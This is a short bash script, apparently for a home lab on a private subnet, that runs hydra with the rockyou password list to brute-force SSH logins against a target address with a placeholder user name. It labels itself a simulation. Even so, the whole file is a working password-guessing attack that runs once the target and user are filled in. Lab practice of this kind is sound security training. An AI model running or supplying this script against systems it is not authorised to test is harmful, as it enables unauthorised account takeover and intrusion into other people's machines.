#!/bin/bash

TARGET="192.168.122.X"
USER="<YOU_USER_NAME_AGENT>"
WORDLIST="$HOME/rockyou.txt"

echo "[*] Starting SSH brute-force simulation against $TARGET"
echo "[*] Using wordlist: $WORDLIST"

hydra -l "$USER" -P "$WORDLIST" ssh://$TARGET -t 1 -W 1 -w 2 -f

echo "[*] Attack finished."
